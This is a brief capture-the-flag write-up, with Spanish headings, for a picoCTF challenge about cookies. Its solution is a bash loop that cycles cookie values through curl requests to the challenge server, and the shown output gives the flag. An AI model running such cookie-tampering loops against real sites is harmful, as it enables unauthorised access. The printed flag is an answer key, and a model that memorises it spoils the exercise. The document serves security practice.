## Descripción
Who doesn't love cookies? Try to figure out the best one.

## Solución
```
Fers-academy@webshell:~$  for i in {1..20}; do curl -s http://wily-courier.picoctf.net:49704/check -H "Cookie: name=$i" | grep "picoCTF"; done
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
```
## Notas adicionales

## Referencias
